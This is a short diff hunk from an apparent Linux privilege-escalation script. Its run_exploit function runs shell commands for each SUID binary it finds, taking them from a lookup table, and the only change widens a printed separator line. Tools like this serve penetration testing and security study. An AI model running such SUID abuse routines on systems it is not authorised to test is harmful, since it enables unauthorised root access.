@@ -99,7 +99,7 @@ def run_exploit(suid_files_arr):
     for sfile in suid_files_arr:
         if sfile in suid_commands:
             cmd = sfile + " " + suid_commands[sfile] + " || true"
-            print('==========================================')
+            print('====================================================================')
             print(f'[*] Running {cmd}...')
             try:
                 res = subprocess.Popen(cmd, shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE, stdout=subprocess.PIPE, universal_newlines=True)
